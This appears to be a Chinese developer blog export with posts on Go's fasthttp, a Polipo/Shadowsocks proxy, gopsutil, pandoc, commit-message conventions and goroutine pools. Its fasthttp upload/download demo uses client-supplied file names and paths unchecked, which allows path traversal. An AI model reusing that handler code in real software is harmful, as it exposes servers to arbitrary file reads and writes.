返回的内容也是可以获取的，不需要标准库的用法，需要自己扩展 http.ResponseWriter fmt.Printf("Host: %s\n", ctx.Host()) fmt.Printf("Body: %s\n", ctx.Response.Body()) fmt.Printf("Path: %s\n", ctx.Path()) fmt.Printf("Method: %s\n", ctx.Method()) fmt.Printf("URI: %s\n", ctx.URI()) fmt.Printf("Connect Time: %s\n", ctx.ConnTime()) fmt.Printf("UserAgent: %s\n", ctx.UserAgent())&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; Body处理fasthttp 提供比标准库丰富的 Body 操作 API，而且支持解析 Gzip 过的数据, 我们可以简单的使用上下文的PostBody方法获取body1234567891011121314151617181920212223242526272829303132package mainimport ( "encoding/json" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; body := ctx.PostBody() // 获取到的是 []byte fmt.Fprintf(ctx, "Body:%s", body) // 因为是 []byte，解析 JSON 很简单 var v interface&#123;&#125; json.Unmarshal(body, &amp;v) fmt.Printf("%v", v)&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 简单的测试结果12➜ Blogs curl -X POST -d &apos;&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125;&apos; http://127.0.0.1:8080/Body:&#123;&quot;name&quot;: &quot;bob&quot;, &quot;age&quot;: 13&#125; 表单处理RequestCtx有同标准库的 FormValue() 方法，还对 GET 和 POST/PUT 传递的参数进行了区分1234567891011121314151617181920212223242526272829303132333435363738394041package mainimport ( "bytes" "fmt" "log" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")func Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;func httpHandler(ctx *fasthttp.RequestCtx) &#123; ctx.SetContentType("text/html") // GET ?abc=abc&amp;abc=123 getValues := ctx.QueryArgs() fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", getValues.Peek("abc")) // Peek 只获取第一个值 fmt.Fprintf(ctx, "GET abc=%s &lt;br/&gt;", bytes.Join(getValues.PeekMulti("abc"), []byte(","))) // PeekMulti 获取所有值 // POST xyz=xyz&amp;xyz=123 postValues := ctx.PostArgs() fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", postValues.Peek("xyz")) fmt.Fprintf(ctx, "POST xyz=%s &lt;br/&gt;", bytes.Join(postValues.PeekMulti("xyz"), []byte(",")))&#125;func main() &#123; router := fasthttprouter.New() router.POST("/", httpHandler) router.GET("/", httpHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125; 输出结果:1234GET abc=abc GET abc=abc,123 POST xyz=xyz POST xyz=xyz,123 文件处理fasthttp提供十分友好的接口, 通过FromFile读文件上传, 通过SendFile来提供下载,但是如果你想更加方便的定制一些信息,最好使用MultipartForm来获取上传对象1234567891011121314151617// MultipartForm returns requests's multipart form.//// Returns ErrNoMultipartForm if request's content-type// isn't 'multipart/form-data'.//// All uploaded temporary files are automatically deleted after// returning from RequestHandler. Either move or copy uploaded files// into new place if you want retaining them.//// Use SaveMultipartFile function for permanently saving uploaded file.//// The returned form is valid until returning from RequestHandler.//// See also FormFile and FormValue.func (ctx *RequestCtx) MultipartForm() (*multipart.Form, error) &#123; return ctx.Request.MultipartForm()&#125; MultipartForm 返回的是一个Form结构体, 我们在从源码中看看这个Form123456789// Form is a parsed multipart form.// Its File parts are stored either in memory or on disk,// and are accessible via the *FileHeader's Open method.// Its Value parts are stored as strings.// Both are keyed by field name.type Form struct &#123; Value map[string][]string File map[string][]*FileHeader&#125; 最好我们按照上面的分析实现了一个简单的下载和上传功能的小Demo12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package mainimport ( "fmt" "html/template" "io" "log" "strconv" "time" "crypto/md5" "github.com/buaazp/fasthttprouter" "github.com/valyala/fasthttp")// Hello Handlerfunc Hello(ctx *fasthttp.RequestCtx) &#123; fmt.Fprintf(ctx, "hello, %s!\n", ctx.UserValue("name"))&#125;// Index Handler, 默认的ContenType是text/plain, 输出的内容在pre标签里面// 因此这里必须手动设置ContentType为text/htmlfunc Index(ctx *fasthttp.RequestCtx) &#123; ctx.Response.Header.SetContentType("text/html") t := template.New("index.gtpl") t, _ = t.Parse(`&lt;html&gt; &lt;head&gt; &lt;title&gt;上传文件&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form enctype="multipart/form-data" action="/upload" method="post"&gt; &lt;input type="file" name="uploadfile" /&gt; &lt;input type="hidden" name="token" value="&#123;&#123;.&#125;&#125;"/&gt; &lt;input type="submit" value="upload" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;`) crutime := time.Now().Unix() h := md5.New() io.WriteString(h, strconv.FormatInt(crutime, 10)) token := fmt.Sprintf("%x", h.Sum(nil)) t.Execute(ctx, token)&#125;// UploadHandler is herefunc UploadHandler(ctx *fasthttp.RequestCtx) &#123; data, err := ctx.MultipartForm() if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("get upload file error:", err) return &#125; fileObj := data.File["uploadfile"][0] err = fasthttp.SaveMultipartFile(fileObj, fileObj.Filename) if err != nil &#123; ctx.SetStatusCode(500) fmt.Println("save upload file error:", err) return &#125; ctx.Write([]byte("save file successfully!"))&#125;// DownloadHandler is herefunc DownloadHandler(ctx *fasthttp.RequestCtx) &#123; fileName := ctx.UserValue("filename") switch fileName := fileName.(type) &#123; case string: ctx.SendFile(fileName) default: ctx.SetStatusCode(500) fmt.Println("the filename is not string.") &#125;&#125;func main() &#123; router := fasthttprouter.New() router.GET("/", Index) router.POST("/upload", UploadHandler) router.GET("/download/:filename", DownloadHandler) router.GET("/hello/:name", Hello) log.Fatal(fasthttp.ListenAndServe(":8080", router.Handler))&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用Polipo构建基于SS的http proxy]]></title>
      <url>%2F2017%2F01%2F24%2Fhttp-proxy%2F</url>
      <content type="text"><![CDATA[搞这个的主要原因是golang的很多依赖包需要翻墙下载, 这不像Python和NodeJS有官方源仓库的语言(配置国内源可以加速). 之前用windows的时候也是使用ss, 而http proxy是通过chrome的一个插件Proxy SwitchyOmega来做的，但是在mac下面这招不灵了, 下面主要介绍mac如何利用ss搭建http proxy. 安装Shadowsocksss的安装和运行是前提, 这里不多做介绍，具体请查看Shadowsocks安装和使用 Polipo简介这里主要使用Polipo来做http proxy, polipo的官方是这样介绍它的：“Polipo 是一个小而快速的缓存 web 代理程序(web 缓存, HTTP 代理, 代理服务器)。尽管 Polipo 是为一个人或一小群人使用而设计的，但并不妨碍它为一大群人所使用。”,该项目的地址 polipo Github地址, 该项目的官方文档polipo官方文档可惜该项目的作者已经停止该项目的维护了, 且用且珍惜。 Polipo安装Shadowsocks官方推荐http proxy代理也是Polipo, 官方对此也做了简单的描述，我直接抄过来了 安装123apt-get install poliposervice polipo stoppolipo socksParentProxy=localhost:1080 以上是官方文档里面的说明，在mac下使用polipo要稍做修改 mac的安装1brew install polipo Polipo使用 ss对polipo的使用样例 1234567891011http_proxy=http://localhost:8123 apt-get updatehttp_proxy=http://localhost:8123 curl www.google.comhttp_proxy=http://localhost:8123 wget www.google.comgit config --global http.proxy 127.0.0.1:8123git clone https://github.com/xxx/xxx.gitgit xxxgit xxxgit config --global --unset-all http.proxy mac的使用打开一个terminal, 不要关掉，象genymotion之类的其他程序就可使用Http代理了. 12➜ ~ polipo socksParentProxy=localhost:1080Established listening socket on port 8123. 然后我们使用使用该http proxy来安装golang包,记得开启的你的ss123456➜ Blogs https_proxy=http://localhost:8123 go get -u -v github.com/valyala/fasthttpgithub.com/valyala/fasthttp (download)github.com/klauspost/compress (download)github.com/klauspost/cpuid (download)github.com/klauspost/crc32 (download)github.com/valyala/bytebufferpool (download)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[夸平台系统监控库-gopsutils]]></title>
      <url>%2F2017%2F01%2F22%2Fgopsutils%2F</url>
      <content type="text"><![CDATA[很欣赏telegraf的架构,之前也多次使用, 最近也要通过他来获取系统运行时信息然后上传,所以想借鉴下telegraf里面的system模块的实现，看了下他的源码，发现他使用了一个名叫gopsutils库来完成所有的系统数据的采集的, 于是决定手动试试这个库的功能。 简介在说gopsutils之前我们必须先说下psutils是啥, 因为gopsutils实际上就是一个golang版本的psutils(从名字上也能看出来)psutils是一个比较出名的python库, psutils是python process and system utilities的一个缩写. 它有如下特点 跨平台: Linux, Windows, OSX, Sun Solaris, FreeBSD, OpenBSD and NetBSD的32位和64位系统 功能丰富: 实现了进程管理,系统诊断, 这个库基本实现了这些命令行工具的功能: ps, top, lsof, netstat, ifconfig, who, df, kill, free, nice, ionice, iostat, iotop, uptime, pidof, tty, taskset, pmap 如果想要了解关于gopsutils更多的详情 请查看gopsutils github地址 安装1➜ gops_test go get -v &quot;github.com/shirou/gopsutil&quot; 使用具体的使用文档可以参考gopsutil的godoc文档以下以测试收集cpu, disk, load, mem, net, process 为列, 注意这些对象都使用String方法, 因此可以直接调用fmt打印，String方法会将其转换成Json输出.12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package mainimport ( "fmt" "github.com/shirou/gopsutil/cpu" "github.com/shirou/gopsutil/disk" "github.com/shirou/gopsutil/load" "github.com/shirou/gopsutil/mem" "github.com/shirou/gopsutil/net" "github.com/shirou/gopsutil/process")func main() &#123; fmt.Println("CPU统计:") c, _ := cpu.Info() fmt.Println(c) fmt.Println("内存统计:") m, _ := mem.VirtualMemory() fmt.Println(m) fmt.Println("磁盘用量和IO统计:") dp, _ := disk.Partitions(true) du, _ := disk.Usage("/") di, _ := disk.IOCounters() fmt.Println(du) fmt.Println(dp) fmt.Println(di) fmt.Println("网络IO统计:") ni, _ := net.IOCounters(true) fmt.Println(ni) fmt.Println("协议统计:") nt, _ := net.ProtoCounters(nil) fmt.Println(nt) fmt.Println("链接状态统计:") nc, _ := net.Connections("all") fmt.Println(nc) fmt.Println("进程统计:") pi, _ := process.Pids() fmt.Println(pi) p, _ := process.NewProcess(614) pm, _ := p.MemoryPercent() pn, _ := p.Username() fmt.Println(pm) fmt.Println(pn) fmt.Println("负载统计:") pl, _ := load.Avg() fmt.Println(pl)&#125; 最后执行过会的结果大概为这样:1234567891011121314151617181920CPU统计:[&#123;&quot;cpu&quot;:0,&quot;vendorId&quot;:&quot;GenuineIntel&quot;,&quot;family&quot;:&quot;6&quot;,&quot;model&quot;:&quot;69&quot;,&quot;stepping&quot;:1,&quot;physicalId&quot;:&quot;&quot;,&quot;coreId&quot;:&quot;&quot;,&quot;cores&quot;:2,&quot;modelName&quot;:&quot;Intel(R) Core(TM) i5-4278U CPU @ 2.60GHz&quot;,&quot;mhz&quot;:2600,&quot;cacheSize&quot;:256,&quot;flags&quot;:[&quot;fpu&quot;,&quot;vme&quot;,&quot;de&quot;,&quot;pse&quot;,&quot;tsc&quot;,&quot;msr&quot;,&quot;pae&quot;,&quot;mce&quot;,&quot;cx8&quot;,&quot;apic&quot;,&quot;sep&quot;,&quot;mtrr&quot;,&quot;pge&quot;,&quot;mca&quot;,&quot;cmov&quot;,&quot;pat&quot;,&quot;pse36&quot;,&quot;clfsh&quot;,&quot;ds&quot;,&quot;acpi&quot;,&quot;mmx&quot;,&quot;fxsr&quot;,&quot;sse&quot;,&quot;sse2&quot;,&quot;ss&quot;,&quot;htt&quot;,&quot;tm&quot;,&quot;pbe&quot;,&quot;sse3&quot;,&quot;pclmulqdq&quot;,&quot;dtes64&quot;,&quot;mon&quot;,&quot;dscpl&quot;,&quot;vmx&quot;,&quot;est&quot;,&quot;tm2&quot;,&quot;ssse3&quot;,&quot;fma&quot;,&quot;cx16&quot;,&quot;tpr&quot;,&quot;pdcm&quot;,&quot;sse4.1&quot;,&quot;sse4.2&quot;,&quot;x2apic&quot;,&quot;movbe&quot;,&quot;popcnt&quot;,&quot;aes&quot;,&quot;pcid&quot;,&quot;xsave&quot;,&quot;osxsave&quot;,&quot;seglim64&quot;,&quot;tsctmr&quot;,&quot;avx1.0&quot;,&quot;rdrand&quot;,&quot;f16c&quot;,&quot;smep&quot;,&quot;erms&quot;,&quot;rdwrfsgs&quot;,&quot;tsc_thread_offset&quot;,&quot;bmi1&quot;,&quot;avx2&quot;,&quot;bmi2&quot;,&quot;invpcid&quot;,&quot;fpu_csds&quot;,&quot;syscall&quot;,&quot;xd&quot;,&quot;1gbpage&quot;,&quot;em64t&quot;,&quot;lahf&quot;,&quot;lzcnt&quot;,&quot;rdtscp&quot;,&quot;tsci&quot;]&#125;]内存统计:&#123;&quot;total&quot;:8589934592,&quot;available&quot;:4315959296,&quot;used&quot;:4273975296,&quot;usedPercent&quot;:49.7556209564209,&quot;free&quot;:3390992384,&quot;active&quot;:2908176384,&quot;inactive&quot;:924966912,&quot;wired&quot;:1364955136,&quot;buffers&quot;:0,&quot;cached&quot;:0,&quot;writeback&quot;:0,&quot;dirty&quot;:0,&quot;writebacktmp&quot;:0,&quot;shared&quot;:0,&quot;slab&quot;:0,&quot;pagetables&quot;:0,&quot;swapcached&quot;:0&#125;磁盘用量和IO统计:&#123;&quot;path&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;total&quot;:249769230336,&quot;free&quot;:201003577344,&quot;used&quot;:48503508992,&quot;usedPercent&quot;:19.41932916506611,&quot;inodesTotal&quot;:60978814,&quot;inodesUsed&quot;:11905675,&quot;inodesFree&quot;:49073139,&quot;inodesUsedPercent&quot;:19.524281006842802&#125;[&#123;&quot;device&quot;:&quot;/dev/disk1&quot;,&quot;mountpoint&quot;:&quot;/&quot;,&quot;fstype&quot;:&quot;hfs&quot;,&quot;opts&quot;:&quot;rw,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;devfs&quot;,&quot;mountpoint&quot;:&quot;/dev&quot;,&quot;fstype&quot;:&quot;devfs&quot;,&quot;opts&quot;:&quot;rw,suiddir,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map -hosts&quot;,&quot;mountpoint&quot;:&quot;/net&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,nosuid,suiddir,nosymfollow,multilabel&quot;&#125; &#123;&quot;device&quot;:&quot;map auto_home&quot;,&quot;mountpoint&quot;:&quot;/home&quot;,&quot;fstype&quot;:&quot;autofs&quot;,&quot;opts&quot;:&quot;rw,suiddir,nosymfollow,multilabel&quot;&#125;]map[]网络IO统计:[&#123;&quot;name&quot;:&quot;lo0&quot;,&quot;bytesSent&quot;:22687,&quot;bytesRecv&quot;:22687,&quot;packetsSent&quot;:215,&quot;packetsRecv&quot;:215,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;gif0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;stf0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en0&quot;,&quot;bytesSent&quot;:6401764,&quot;bytesRecv&quot;:120874758,&quot;packetsSent&quot;:85192,&quot;packetsRecv&quot;:87266,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en1&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;en2&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;p2p0&quot;,&quot;bytesSent&quot;:0,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:0,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;awdl0&quot;,&quot;bytesSent&quot;:2331,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:2,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125; &#123;&quot;name&quot;:&quot;bridg&quot;,&quot;bytesSent&quot;:342,&quot;bytesRecv&quot;:0,&quot;packetsSent&quot;:1,&quot;packetsRecv&quot;:0,&quot;errin&quot;:0,&quot;errout&quot;:0,&quot;dropin&quot;:0,&quot;dropout&quot;:0,&quot;fifoin&quot;:0,&quot;fifoout&quot;:0&#125;]协议统计:[]链接状态统计:[&#123;&quot;fd&quot;:13,&quot;family&quot;:2,&quot;type&quot;:2,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;*&quot;,&quot;port&quot;:63824&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;&quot;,&quot;port&quot;:0&#125;,&quot;status&quot;:&quot;&quot;,&quot;uids&quot;:null,&quot;pid&quot;:238&#125; &#123;&quot;fd&quot;:64,&quot;family&quot;:2,&quot;type&quot;:1,&quot;localaddr&quot;:&#123;&quot;ip&quot;:&quot;192.168.3.7&quot;,&quot;port&quot;:49224&#125;,&quot;remoteaddr&quot;:&#123;&quot;ip&quot;:&quot;191.238.172.191&quot;,&quot;port&quot;:443&#125;,&quot;status&quot;:&quot;CLOSED&quot;,&quot;uids&quot;:null,&quot;pid&quot;:394&#125;]进程统计:[1 45 46 48 49 53 54 55 62 64 65 69 70 71 73 74 76 77 79 80 81 82 83 85 88 89 93 95 96 97 98 100 101 102 105 110 118 130 133 135 136 142 143 147 149 159 168 169 170 171 172 173 174 175 179 182 183 184 185 187 188 189 190 192 195 196 197 198 200 218 219 220 226 227 229 231 232 233 237 238 239 242 243 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 265 266 267 268 269 270 271 272 273 274 276 277 278 279 280 281 282 283 284 285 286 287 289 290 291 292 294 295 296 297 299 300 302 305 307 308 311 312 314 316 317 324 325 329 339 340 342 343 344 345 346 348 360 361 362 366 367 368 371 377 386 391 392 393 394 397 423 426 427 428 429 430 433 437 443 445 446 451 452 454 455 456 461 463 469 470 474 475 477 481 483 486 487 488 511 514 554 555 624 650 711 722 723 724 725 726 727 729 736 737 741 742 743 791 866 867 878 880 883 889 516 517 518]0root负载统计:&#123;&quot;load1&quot;:1.32,&quot;load5&quot;:1.35,&quot;load15&quot;:1.31&#125;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用pandoc将markdown文档转换成pdf]]></title>
      <url>%2F2017%2F01%2F19%2Fmarkdown-to-pdf%2F</url>
      <content type="text"><![CDATA[在公司做内部分享的时候往往用ppt, 写ppt的过程中往往还有比较多的代码示例, 通常的做法就是直接截图, 其实这对使用者来说是很不友好的, 而我之前一直使用markdown写博客, 比如我这个博客, 因此就想使用MarkDown来写分享的文档, 但是MarkDown的文档并不方便内部传阅, 因此想到了一个问题: 能否用MarkDown写, 然后转换成PDF, 给同事使用？于是问了下度娘, 果然找到了一个工具: Pandoc, 使用下来感觉不错, 在此分享一下使用方法, 也方便以后自己查阅。 简介Pandoc是一个用haskell编写的开源文本转换工具，小巧迅速且支持格式广泛，堪称文本转换应用的瑞士军刀。支持很多种输入输出，有关Pandoc可以在其官网进行详细了解。下载页面可以点此进入，在其中选择合适的版本即可（GitHub下载不多赘述), 至于详细的描述请看github上的说明。我这里主要使用 markdown—-&gt;pdf。 安装我这里仅介绍Mac下的安装, 需要安装pandoc和LaTeX其他平台官方有详尽的介绍, 具体请查看：pandoc官方安装文档 pandoc安装1$ brew install pandoc LaTeX安装因为我需要转换成pdf,还需要装LaTeX, 选一个Basic版本的安装即可, LaTeX的下载地址 使用简单的使用可以1$ pandoc -h 详细用法可以man查看，我这里直接给干活了,我使用庞房,这里记得选一种你系统上有的字体。1pandoc -N -s --toc --latex-engine=xelatex -V CJKmainfont=&apos;PingFang SC&apos; -V mainfont=&apos;Monaco&apos; -V geometry:margin=1in Keystone_extension.markdown -o Keystone.pdf 注意事项主要是Pandoc默认是对markDown语法有扩展，如果遇到转换后的效果和预期效果不一样, 还得阅读Pandoc扩展的MarkDown语法, 这篇博客对次介绍不错Pandoc中的markdown语法我这里仅列举一个我遇到的坑，当然如果你想使用标准的MarkDown语法，也可-f markdown_strict。 图片位置对应不上在markDown中插入的图片和Markdown里的不一样, 这里需要在图片后面添加一个\, 这样图片才不会换行, 这个在它扩展语法中有描述。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[commit message编写规范]]></title>
      <url>%2F2017%2F01%2F17%2Fcommit-message-style%2F</url>
      <content type="text"><![CDATA[Git每次提交代码，都要写Commit message(提交说明)，否则就不允许提交, Commit message往往会用于生成Change log文档, 规范的Commit message是一个高质量项目基本要求。社区有多种Commit message的写法规范。其中以国际知名项目AngularJS的规范使用最为广泛, 因为其比较合理和系统化,并且有相应的配套工具。 作用格式化得Commit message有很多好处 提供更多的历史信息，方便快速浏览 1234567$ git log &lt;last tag&gt; HEAD --pretty=format:%s添加testcase添加ignore格式添加py2支持补充entry_points添加测试环境文件添加tox测试相关文件 可以过滤某些commit（比如文档改动），便于快速查找信息 123456789101112131415git log HEAD --grep '添加'commit dfedec2ca55bc57137e1ffe430f9f7216d912ca0Merge: 5fcae1d f5c5120Author: 紫川秀 &lt;719118794@qq.com&gt;Date: Mon Jan 9 19:13:47 2017 +0800 Merge pull request #1 from huang75961/master 添加tox测试commit f5c5120ac5bb43529bd2eb9e83ccef023450a8a5Author: hc &lt;409438984@qq.com&gt;Date: Mon Jan 9 19:00:32 2017 +0800 添加testcase 可以直接从commit生成Change log 这个需要配合后面的工具使用 规范每次提交，Commit message 都包括三个部分：Header，Body 和 Footer。12345&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;&lt;body&gt;&lt;footer&gt; 其中，Header 是必需的，Body 和 Footer 可以省略。不管是哪一个部分，任何一行都不得超过72个字符（或100个字符）。这是为了避免自动换行影响美观。 HeaderHeader部分只有一行，包括三个字段：type（必需）、scope（可选）和subject（必需）。 type用于说明commit的类别，只允许使用下面7个标识 feat：新功能（feature） fix：修补bug docs：文档（documentation） style： 格式（不影响代码运行的变动） refactor：重构（即不是新增功能，也不是修改bug的代码变动） test：增加测试 chore：构建过程或辅助工具的变动 如果type为feat和fix，则该commit将肯定出现在Change log之中。其他情况（docs、chore、style、refactor、test）由你决定，要不要放入Change log，建议是不要。 scopescope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同 subjectsubject是 commit 目的的简短描述，不超过50个字符。 以动词开头，使用第一人称现在时，比如change，而不是changed或changes 第一个字母小写 结尾不加句号（.） BodyBody 部分是对本次 commit 的详细描述，可以分成多行。但是有两个注意点。 使用第一人称现在时，比如使用change而不是changed或changes。 应该说明代码变动的动机，以及与以前行为的对比。下面是一个angular项目下面的一个范例。1234567891011Protractor users were having a problem where if they had asynchonous code in a`route.resolve` or `route.resolveRedirectTo` variable, Protractor was notwaiting for that code to complete before continuing. Seeangular/protractor#789 (comment) fordetails.This commit fixes it by ensuring that `$browser#outstandingRequestCount` isproperly increased/decreased while `$route` (asynchronously) processes a route.Also, enhanced `ngMock` to wait for pending requests, before calling callbacksfrom `$browser.notifyWhenNoOutstandingRequests()`. Footer该部分主要是用于变更过会的一些后续操作的, 比如关闭issue, 撤销之前的commit等 关闭Issue如果当前 commit 针对某个issue，那么可以在 Footer 部分关闭这个 issue 。也可以一次关闭多个issue 1Closes #112 1Closes #221, 222, 223 撤销之前的commit如果当前 commit 用于撤销以前的 commit，则必须以revert:开头，后面跟着被撤销 Commit 的 Header。Body部分的格式是固定的，必须写成This reverts commit hash.，其中的hash是被撤销 commit 的 SHA 标识符。如果当前 commit 与被撤销的 commit，在同一个发布（release）里面，那么它们都不会出现在 Change log 里面。如果两者在不同的发布，那么当前 commit，会出现在 Change log 的Reverts小标题下面。123revert: feat(pencil): add 'graphiteWidth' optionThis reverts commit 667ecc1654a317a13331b17617d973392f415f02. 不兼容变动如果当前代码与上一个版本不兼容，则 Footer 部分以BREAKING CHANGE开头，后面是对变动的描述、以及变动理由和迁移方法。1234567891011121314151617BREAKING CHANGE: isolate scope bindings definition has changed. To migrate the code follow the example below: Before: scope: &#123; myAttr: 'attribute', &#125; After: scope: &#123; myAttr: '@', &#125; The removed `inject` wasn't generaly useful for directives so there should be no code using it. 工具基于commit message有丰富的工具，包括编辑器，校验工具，以及生成Change log的工具 Commitizen编辑工具Commitizen是一个撰写合格 Commit message 的工具, 详细说明github地址 安装1) 全局安装(记得使用淘宝源来加速)123➜ ~ npm install -g commitizen➜ ~ npm install -g cz-conventional-changelogecho '&#123; "path": "cz-conventional-changelog" &#125;' &gt; ~/.czrc 2）局部安装12➜ ~ npm install commitizen -g➜ ~ commitizen init cz-conventional-changelog --save-dev --save-exact 主要如果报package.json不存在,需要添加这个文件, 这是nodejs的包管理文件, 格式可以参数commitizen包的package.json 使用123456789101112131415➜ device git:(master) ✗ git czcz-cli@2.9.5, cz-conventional-changelog@1.2.0Line 1 will be cropped at 100 characters. All other lines will be wrapped after 100 characters.? Select the type of change that you're committing: (Use arrow keys)❯ feat: A new feature fix: A bug fix docs: Documentation only changes style: Changes that do not affect the meaning of the code (white-space, formatting, missing semi-colons, etc) refactor: A code change that neither fixes a bug nor adds a feature perf: A code change that improves performance test: Adding missing tests or correcting existing tests(Move up and down to reveal more choices) validate-commit-msg校验工具validate-commit-msg 用于检查 Node 项目的 Commit message 是否符合格式。我暂时不需要,github地址 生成Change log的工具conventional-changelog 就是生成 Change log 的工具，运行下面的命令即可。github地址123$ npm install -g conventional-changelog-cli$ cd my-project$ conventional-changelog -p angular -i CHANGELOG.md -s 上面命令不会覆盖以前的 Change log，只会在CHANGELOG.md的头部加上自从上次发布以来的变动。如果你想生成所有发布的 Change log，要改为运行下面的命令。1$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0 为了方便使用，可以将其写入package.json的scripts字段。1234&#123; "scripts": &#123; "changelog": "conventional-changelog -p angular -i CHANGELOG.md -w -r 0" &#125;&#125; 以后，直接运行下面的命令即可。1$ npm run changelog]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Golang并发编程-协程池]]></title>
      <url>%2F2017%2F01%2F12%2Fgoroutine-pool%2F</url>
      <content type="text"><![CDATA[在最近开发的项目中，后端需要编写许多提供HTTP接口的API，之所以选择Golang，主要是考虑到开发的模块，都需要接受瞬时大并发、、CPU密集型的分析任务、处理时间较长、无法同步立即返回结果的场景，Golang的goroutine以及channel所提供的语言层级的特性，正好可以满足这方面的需要 如何高并发并发模式下有很多问题需要我们关注, 因此我们设计出来的goroutine pool应该关注如下一些问题 goroutine的高并发goroutine的一个主要特性就是它们的消耗；创建它们的初始内存成本很低(与需要1至8MB内存的传统POSIX线程形成鲜明对比)以及根据需要动态增长和缩减占用的资源。这使得goroutine会从4096字节的初始栈内存占用开始按需增长或缩减内存占用, 在一般的需求下, 我们无需担心资源的耗尽。 Go语言通过系统的线程来多路派遣这些函数的执行，使得每个用go关键字执行的函数可以运行成为一个单位协程。当一个协程阻塞的时候，调度器就会自动把其他协程安排到另外的线程中去执行，从而实现了程序无等待并行化运行。而且调度的开销非常小，一颗CPU调度的规模不下于每秒百万次，这使得我们能够创建大量的goroutine，从而可以很轻松地编写高并发程序，达到我们想要的目的 简单来说：协程十分轻量，可以在一个进程中执行有数以十万计的协程，依旧保持高性能。 因此我们使用goroutine处理任务, 大概模型为：1234567891011121314151617package mainimport ( "fmt" "time")func say(s string) &#123; fmt.Println(s)&#125;func main() &#123; for _, word := range []string&#123;"hello", "world", "this", "is", "my", "goroutine", "test"&#125; &#123; go say(word) //开一个新的Goroutines执行 &#125; time.Sleep(time.Second * 1) // 等待goroutine跑完, 我为了方便使用了sleep的方式&#125; 利用协序池做并发控制虽然goroutine很便宜, 但也不是免费的, 总有一个时候你系统会扛不住，我们不能天真的对goroutine的数量不加限制的使用, 因此我们需要一种并发的限制机制来保证程序的稳定, 使得程序不会因为过多的goroutine而崩溃, 至于多少个goroutine 就需要根据自己环境测试得出。 